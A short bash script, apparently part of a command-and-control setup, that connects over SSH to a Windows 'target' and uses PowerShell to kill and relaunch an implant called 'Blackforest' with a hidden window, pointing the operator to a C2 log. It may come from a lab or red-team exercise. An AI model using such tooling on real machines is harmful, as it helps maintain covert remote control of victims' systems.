#!/bin/bash
# One-Time Agent Restart Script
# Activates the bug-fixed binary on Windows target

echo "[*] Restarting Blackforest agent with bug-fixed binary..."

ssh "pss trust@192.168.0.6" "powershell.exe -Command \"Stop-Process -Name Blackforest -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 3; Start-Process '\$env:USERPROFILE\\Downloads\\Blackforest.exe' -WindowStyle Hidden\""

echo "[+] Command sent! Agent should restart in 3 seconds..."
echo "[*] Watch for '[*] Blackforest Agent Started' in c2/blackforest_logs.txt"
